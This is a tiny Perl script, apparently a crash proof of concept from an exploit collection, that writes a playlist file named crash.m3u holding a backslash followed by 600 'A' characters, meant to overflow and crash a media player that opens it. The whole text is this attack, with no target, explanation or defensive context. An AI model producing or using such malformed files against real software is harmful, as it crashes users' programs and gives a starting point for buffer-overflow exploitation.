$file= "crash.m3u";
$buffer= "\\";
$buffer .="A" x 600;


open($FILE,">$file");
print $FILE $buffer;
close($FILE);
